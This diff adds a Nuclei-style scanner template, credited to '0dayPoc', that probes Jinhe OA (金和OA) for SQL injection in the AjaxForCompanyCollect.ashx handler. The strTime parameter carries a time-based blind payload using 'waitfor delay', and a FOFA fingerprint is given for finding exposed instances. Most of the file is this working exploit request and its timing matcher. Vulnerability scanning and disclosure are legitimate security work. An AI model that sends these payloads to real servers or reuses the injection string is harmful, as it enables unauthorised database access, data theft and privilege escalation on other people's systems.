@@ -1,0 +1,29 @@
+id: jinhe-oa-ajaxforcompanycollect-sqli
+info:
+  name: 金和OA系统AjaxForCompanyCollect.ashx接口SQL注入风险
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: app="金和网络-金和OA"
+      金和网络-金和OA系统中AjaxForCompanyCollect.ashx处理组件存在SQL注入缺陷，攻击者可通过构造恶意输入参数实现数据库查询语句污染。该漏洞允许远程攻击者执行任意SQL命令，可能导致敏感数据泄露、数据完整性破坏或系统权限提升。漏洞影响范围覆盖所有未修复的金和OA系统实例，可通过FOFA搜索引擎使用指定app指纹进行资产识别。
+  tags: 金和OA
+http:
+- raw:
+  - |
+    POST /c6/JHSoft.Web.CostControl/Collect/Handlers/AjaxForCompanyCollect.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    strType=getCollectList&strTime=1;waitfor+delay+'0:0:5'--+&strAppType=start&strYear=2012
+  - |
+    POST /c6/JHSoft.Web.CostControl/Collect/Handlers/AjaxForCompanyCollect.ashx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    strType=getCollectList&strTime=1;waitfor+delay+'0:0:8'--+&strAppType=start&strYear=2012
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
